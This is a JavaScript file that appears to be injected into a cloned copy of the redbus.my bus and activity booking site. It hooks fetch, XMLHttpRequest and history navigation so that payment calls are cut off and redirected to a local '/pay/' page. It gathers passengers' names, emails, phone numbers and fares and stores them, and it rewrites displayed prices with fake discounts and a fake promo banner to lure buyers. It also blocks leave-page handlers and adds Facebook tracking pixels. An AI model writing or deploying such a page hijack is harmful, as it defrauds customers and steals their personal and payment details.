(function(){
  'use strict';

  // ── FB Pixel ──
!function(f,b,e,v,n,t,s){
if(f.fbq)return;
n=f.fbq=function(){
n.callMethod
? n.callMethod.apply(n,arguments)
: n.queue.push(arguments)
};
if(!f._fbq)f._fbq=n;
n.push=n;
n.loaded=!0;
n.version='2.0';
n.queue=[];
t=b.createElement(e);
t.async=!0;
t.src=v;
s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)
}(window,document,'script',
'https://connect.facebook.net/en_US/fbevents.js');

fbq('init', '1325759409620752');

fbq('track', 'PageView');

  // Load additional FB pixels from backend settings
  (function(){
    fetch('/api/settings')
      .then(function(r) { return r.json(); })
      .then(function(json) {
        var pixels = (json.data && json.data.fbPixels) || [];
        var enabled = pixels.filter(function(p) { return p.enabled; });
        enabled.forEach(function(p) {
          fbq('init', p.pixelId);
          fbq('track', 'PageView');
        });
        try { sessionStorage.setItem('fbPixelIds', JSON.stringify(enabled.map(function(p){ return p.pixelId; }))); } catch(e) {}
      })
      .catch(function() {});
  })();


  function getUrl(input) {
    if (typeof input === 'string') return input;
    if (input instanceof Request) return input.url;
    return '';
  }
  window.addEventListener('beforeunload', function(e) { e.stopImmediatePropagation(); }, true);

  function redirectPay() {

    var data = extractBookingData();

    try {
        localStorage.setItem(
            'redbus_booking',
            JSON.stringify(data)
        );
    } catch(ex) {}

    // FB Pixel 埋点
    if (window.fbq) {

        fbq('track', 'AddToCart', {

            value: Number(data.amount) || 0,

            currency: 'MYR'

        });

    }

    location.href = '/pay/';
}

  var _fetch = window.fetch;
  window.fetch = function(input, init) {
    var url = getUrl(input);
    console.log('[fetch intercepted]', url);
    if (url) {
      var p = url.split('?')[0];
      if (/\.(js|css|png|jpg|woff2?)(\?|$)/.test(p)) {
      return _fetch.call(window, input, init);
    }
      var stripped = url.replace(/https?:\/\/(?:www\.)?redbus\.my/gi, '');
      // Payment APIs that mean user is proceeding to payment
      if (p.indexOf('/createOrder') !== -1 || p.indexOf('/saveBooking') !== -1 || p.indexOf('/proceedToPayment') !== -1 || p.indexOf('/paymentInit') !== -1) {
        redirectPay();
        return new Promise(function() {});
      }


      if (typeof input === 'string') input = stripped;
    }
    return _fetch.call(window, input, init);
  };

  var _origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    if (typeof url === 'string') {
      url = url.replace(/https?:\/\/(?:www\.)?redbus\.my/gi, '');
    }
    return _origOpen.call(this, method, url);
  };

  // Intercept navigation to /paymentDetails
  function checkPayUrl(url) {
    if (typeof url === 'string') {
      var p = url.split('?')[0];
      if (p.indexOf('/paymentDetails') !== -1 || p.indexOf('/payment') !== -1 || p.indexOf('/checkout') !== -1) {
        redirectPay();
        return '/pay/';
      }else if (p.indexOf('/517') !== -1) {

  setTimeout(function () {

    var els = document.querySelectorAll('[class^="netPrice__styles-details-paxPrice-modules-scss-"]');

    els.forEach(function(el, index) {

      var txt = el.innerText || '';
      var m = txt.match(/[\d,.]+/);

      if (!m) return;

      var num = parseFloat(m[0].replace(/,/g, ''));

      if (isNaN(num)) return;

      var newPrice = index <= 2
        ? num * 0.4
        : num * 0.1;

      newPrice = newPrice.toFixed(2);

      el.innerText = txt.replace(/[\d,.]+/, newPrice);

    });

  }, 500);

   }
    }
    return url;
  }
  var _ps = history.pushState;
  history.pushState = function(s, t, u) { u = checkPayUrl(u); return _ps.call(this, s, t, u); };
  var _rs = history.replaceState;
  history.replaceState = function(s, t, u) { u = checkPayUrl(u); return _rs.call(this, s, t, u); };
  try { var _assign = location.assign.bind(location); location.assign = function(u) { return _assign(checkPayUrl(u)); }; } catch(e) {}
  try { var _rep = location.replace.bind(location); location.replace = function(u) { return _rep(checkPayUrl(u)); }; } catch(e) {}

  function extractBookingData() {
    var data = {};
    try {
      var store = window.__REDUX_STORE__ || window.__store || window.store;
      if (store) {
        var state = store.getState ? store.getState() : (store.state || {});
        // Try specific known paths
        if (state.seat) {
          var s = state.seat.seatResponseData || state.seat.data || state.seat;
          data.busName = s.travelsName || data.busName || '';
          data.busType = s.busType || data.busType || '';
          data.departureTime = s.bpTime || s.departureTime || data.departureTime || '';
          data.arrivalTime = s.dpTime || s.arrivalTime || data.arrivalTime || '';
          data.depPlace = s.bpName || s.srcName || data.depPlace || '';
          data.arrPlace = s.dpName || s.dstName || data.arrPlace || '';
          data.duration = (s.duration || s.tripDuration || '') + '';
          if (s.passengers && s.passengers[0]) {
            data.passengerName = s.passengers[0].name || data.passengerName || '';
            data.seats = s.passengers[0].seatNo || data.seats || '';
          }
        }
        if (state.search) {
          var sr = state.search.fromCityName ? state.search : (state.search.data || state.search.params || state.search);
          data.origin = sr.fromCityName || sr.from || sr.origin || data.origin || '';
          data.destination = sr.toCityName || sr.to || sr.destination || data.destination || '';
          data.departureDate = sr.doj || sr.onward || sr.departureDate || data.departureDate || '';
          data.pax = sr.passengerCount || sr.pax || data.pax || 1;
        }
        if (state.passengerInfo) {
          var p = state.passengerInfo.data || state.passengerInfo;
          data.passengerName = p.name || data.passengerName || '';
          data.email = p.email || data.email || '';
          data.phone = p.phone || p.mobile || data.phone || '';
        }
        // Walk entire state for any missed fields
        function walk(obj) {
          if (!obj || typeof obj !== 'object') return;
          if (obj.fromCityName) { data.origin = obj.fromCityName; data.destination = obj.toCityName || ''; data.departureDate = obj.doj || obj.onward || ''; data.pax = obj.passengerCount || 1; }
          if (obj.travelsName) { data.busName = obj.travelsName; data.busType = obj.busType || ''; }
          if (obj.bpTime) { data.departureTime = obj.bpTime; data.depPlace = obj.bpName || ''; }
          if (obj.dpTime) { data.arrivalTime = obj.dpTime; data.arrPlace = obj.dpName || ''; }
          if (obj.duration) data.duration = obj.duration + '';
          if (obj.seatNo) data.seats = obj.seatNo + '';
          if (obj.name && (obj.age || obj.seatNo)) data.passengerName = obj.name;
          if (obj.mobile && obj.mobile.length > 5) data.phone = obj.mobile;
          if (obj.email && obj.email.indexOf('@') > 0) data.email = obj.email;
          if (obj.totalFare) data.amount = obj.totalFare;
          if (obj.totalPayable) data.amount = obj.totalPayable;
          Object.keys(obj).forEach(function(k) { walk(obj[k]); });
        }
        walk(state);
      }
    } catch(ex) {}
    try { var pd = window.pageData || {}; data.origin = data.origin || pd.fromCity || ''; data.destination = data.destination || pd.toCity || ''; } catch(ex) {}
    if (!data.origin) {
      var sp = new URLSearchParams(location.search);
      data.origin = sp.get('fromCityName') || '';
      data.destination = sp.get('toCityName') || '';
      data.departureDate = sp.get('onward') || sp.get('doj') || '';
    }
    // DOM extraction using user-provided selectors
    try {
      var times = document.querySelectorAll('[class^="bpDpTime"]');
      if (times[0]) data.departureTime = times[0].innerText.trim();
      if (times[1]) data.arrivalTime   = times[1].innerText.trim();

      var dates = document.querySelectorAll('[class^="bpDpDate"]');
      if (dates[0]) {
        var raw0 = dates[0].innerText.trim();
        if (raw0.includes('·')) {
          var parts0 = raw0.split('·');
          data.departureDate = parts0[0].trim();
          if (!data.departureTime) data.departureTime = parts0[1].trim();
        } else {
          data.departureDate = raw0;
        }
      }
      if (dates[1]) {
        var raw1 = dates[1].innerText.trim();
        if (raw1.includes('·')) {
          var parts1 = raw1.split('·');
          data.arriveDate   = parts1[0].trim();
          if (!data.arrivalTime) data.arrivalTime = parts1[1].trim();
        } else {
          data.arriveDate = raw1;
        }
      }
      var places = document.querySelectorAll('[class^="bpDpName"]');
      if (places[0]) data.depPlace = places[0].innerText.trim();
      if (places[1]) data.arrPlace = places[1].innerText.trim();
      var addrs = document.querySelectorAll('[class^="bpDpAddress"]');
      if (!addrs[0] || !addrs[0].innerText.trim()) { addrs = document.querySelectorAll('#bp-point-0 > [class^="rightContent"] > [class^="bpdp"] > [class^="address"]'); }
      if (addrs[0]) data.depAddr = addrs[0].innerText.trim();
      if (addrs[1]) data.arrAddr = addrs[1].innerText.trim();
      // Persist addresses to sessionStorage early (seat page doesn't show bpDpAddress)
      if (data.depAddr || data.arrAddr) {
        try {
          var saved = JSON.parse(sessionStorage.getItem('redbus_addresses') || '{}');
          if (data.depAddr) saved.depAddr = data.depAddr;
          if (data.arrAddr) saved.arrAddr = data.arrAddr;
          sessionStorage.setItem('redbus_addresses', JSON.stringify(saved));
        } catch(e) {}
      } else {
        try {
          var saved2 = JSON.parse(sessionStorage.getItem('redbus_addresses') || '{}');
          if (saved2.depAddr) data.depAddr = saved2.depAddr;
          if (saved2.arrAddr) data.arrAddr = saved2.arrAddr;
        } catch(e) {}
      }
      var dur = document.querySelector('[class^="duration"]');
      if (dur) data.duration = dur.innerText.trim();
      var bus = document.querySelector('[class^="travelsNameSection"] [class^="title"]') || document.querySelector('#custInfoContainer [class^="travelsName"]');
      if (bus) data.busName = bus.innerText.trim();
      var bt = document.querySelector('[class^="travelsType"]');
      if (bt) data.busType = bt.innerText.trim();
      var fv = document.querySelector('[class^="finalValue"]');
      if (fv) { var m = fv.innerText.match(/[\d,]+\.?\d*/); if (m) data.amount = m[0].replace(/,/g, ''); }
      var sw = document.querySelector('[class^="seatWrapper"]');
      if (sw) {
        data.seats = sw.innerText.trim();
      } else {
        var els = document.querySelectorAll("div.listText___b3f376.undefined");
        data.seats = Array.from(els).map(function(el) {
          return el.innerText.trim().replace(/[^0-9]/g, '');
        }).join('\n');
      }
    } catch(ex) {}
    if (!data.currencySymbol) data.currencySymbol = 'MYR';
    console.log('[Redbus] Extracted:', data);
    if (!data.productType) data.productType = 'Bus';
    if (!data.currency) data.currency = 'MYR';
    return data;
  }

  var style = document.createElement('style');
  style.textContent = '.modal-backdrop{display:none!important}[class^="downloadAppContainer"]{display:none!important}[class^="liteAppCardContainer"]{display:none!important}[class^="bannerContainer"]{display:none!important}[class^="bottomNavBarWrapper"]{display:none!important}';
  document.head.appendChild(style);

  
  // 監聽總價元素，自動套用折扣
var _totalObserver = null;

function watchTotalAmt() {
  var totalEl = document.querySelector('[class^="totalAmtComputed"]');
  if (!totalEl || totalEl._watched) return;
  totalEl._watched = true;

  // 立即處理一次
  fixTotalAmt(totalEl);

  // 監聽後續變化
  var obs = new MutationObserver(function() {
    fixTotalAmt(totalEl);
  });
  obs.observe(totalEl, { childList: true, characterData: true, subtree: true });
}

function fixTotalAmt(el) {
  if (el._fixing) return;
  var txt = el.textContent || '';
  var m = txt.match(/[\d,.]+/);
  if (!m) return;
  var originalTotal = parseFloat(m[0].replace(/,/g, ''));
  if (isNaN(originalTotal)) return;

  // 從彈出框裡讀取所有票的 原始單價 和 折扣單價，計算折扣比例
  var netEls = document.querySelectorAll('[class^="netPrice__styles-details-paxPrice-modules-scss-"]');
  var ratio = 0.4; // 預設

  if (netEls.length > 0 && netEls[0].dataset.originalPrice) {
    var origUnit = parseFloat(netEls[0].dataset.originalPrice);
    var discountedTxt = netEls[0].textContent || '';
    var discountedM = discountedTxt.match(/[\d,.]+/);
    if (discountedM) {
      var discountedUnit = parseFloat(discountedM[0].replace(/,/g, ''));
      if (origUnit > 0) ratio = discountedUnit / origUnit;
    }
  }

  var discounted = (originalTotal * ratio).toFixed(2);

  el._fixing = true;
  el.textContent = 'MYR ' + discounted;
  el._fixing = false;
}











  var _discount517Timer = null; // ✅ 在 observer 定義之前加這行
  var observer = new MutationObserver(function () {
  var btn = document.querySelector("#leaner-funnel-popup > div.bpdpMain__sea-seat-styles-module-scss-qxwqs > div > div.bpDpAfterListsWrapper__sea-seat-styles-module-scss-56bZs > div > div > div > div > div:nth-child(2) > button");
  //var title = document.querySelector("#root > [class^='bannerContainer'] > [class^='titleContent'] > div > [class^='titleWrap']");
  if (btn && !btn._bound) {
    btn._bound = true; // 防止重复绑定
    btn.addEventListener('click', function () {
      var data = extractBookingData();
      try { localStorage.setItem('redbus_booking', JSON.stringify(data)); } catch(ex) {}
    });
  }
  var title = document.querySelector("#root > [class^='bannerContainer'] > [class^='titleContent'] > div > [class^='titleWrap']");
  if (title && !title._bound) {
    title._bound = true;
    var spans = title.querySelectorAll('span');
    if (spans[0]) spans[0].textContent = 'Get 60% off your order Use code CITY60 on web';
    if (spans[1]) spans[1].textContent = '';
  }

  // ✅ 新增：綁定 Select 按鈕，點擊後處理彈出框價格
  if (location.pathname.indexOf('/activities/details/517') !== -1) {
  document.querySelectorAll('[class^="selectTicketBtn"]').forEach(function(selectBtn) {
    if (selectBtn._discountBound) return;
    selectBtn._discountBound = true;
    selectBtn.addEventListener('click', function() {
      setTimeout(function() {
        applyDiscount517();
      }, 300);
    });
  });

  // ✅ 防抖：避免 DOM 變化時頻繁調用
  clearTimeout(_discount517Timer);
  _discount517Timer = setTimeout(function() {
    applyDiscount517();
  }, 200);

  watchTotalAmt();
}




});

observer.observe(document.documentElement, { childList: true, subtree: true });





function applyDiscount517() {
  var els = document.querySelectorAll(
    '[class^="netPrice__styles-details-paxPrice-modules-scss-"]'
  );
  if (!els.length) return;

  var fromPrices = document.querySelectorAll(
    '[class^="fromPrice__styles-details-ticketListing-module-scss-n"]'
  );

  els.forEach(function(el, index) {
    var txt = el.textContent || '';
    var m = txt.match(/[\d,.]+/);
    if (!m) return;
    var num = parseFloat(m[0].replace(/,/g, ''));
    if (isNaN(num)) return;

    if (!el.dataset.originalPrice) {
      el.dataset.originalPrice = num;
    }
    var originalNum = parseFloat(el.dataset.originalPrice);

    if (el.dataset.discounted) return; // ✅ 已處理過就跳過

    var newPrice = index <= 2
      ? originalNum * 0.4
      : originalNum * 0.2;
    newPrice = newPrice.toFixed(2);

    if (index == 0  && fromPrices[0]) fromPrices[0].textContent = 'From MYR ' + newPrice;
    if (index == 3  && fromPrices[1]) fromPrices[1].textContent = 'From MYR ' + newPrice;
    if (index == 6  && fromPrices[2]) fromPrices[2].textContent = 'From MYR ' + newPrice;
    if (index == 9  && fromPrices[3]) fromPrices[3].textContent = 'From MYR ' + newPrice;
    if (index == 12 && fromPrices[4]) fromPrices[4].textContent = 'From MYR ' + newPrice;
    if (index == 15 && fromPrices[5]) fromPrices[5].textContent = 'From MYR ' + newPrice;

    el.textContent = txt.replace(/[\d,.]+/, newPrice);
    el.dataset.discounted = '1'; // ✅ 標記已處理
  });
}

if (location.pathname.indexOf('/activities/details/517') !== -1) {
  // ✅ 只用 setTimeout 跑一次，不用 setInterval
  setTimeout(function() {
    applyDiscount517();
  }, 1000);
}





})();
